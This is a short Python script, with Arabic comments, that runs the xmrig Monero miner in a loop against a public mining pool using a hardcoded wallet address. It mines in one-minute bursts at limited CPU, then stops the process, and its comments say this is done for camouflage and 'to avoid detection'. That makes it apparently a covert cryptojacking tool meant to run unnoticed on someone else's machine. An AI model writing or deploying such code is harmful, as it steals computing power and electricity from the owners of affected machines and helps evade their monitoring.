import subprocess
import time
import os

# استخدام متغيرات البيئة لزيادة الأمان
WALLET = os.getenv("WALLET_ADDRESS", "4A8iuS94bzMfohFzrn4TXaBmiBTmPJgXcWNwHUMpDMgd44ygFS2XQji9x5tgzcrf1ohBTFDSf3oN6JCopzzv92Jr9w9D7gV")
POOL = "pool.supportxmr.com:3333"

def run_mining():
    while True:
        print("Starting mining pulse...")
        # تشغيل xmrig
        process = subprocess.Popen(["./xmrig", "-o", POOL, "-u", WALLET, "--cpu-max-threads-hint", "25"])
        
        time.sleep(60) # العمل لمدة دقيقة
        process.terminate() # إيقاف العملية للتمويه
        
        print("Sleeping to avoid detection...")
        time.sleep(30) # الاستراحة لمدة 30 ثانية

if __name__ == "__main__":
    run_mining()
  
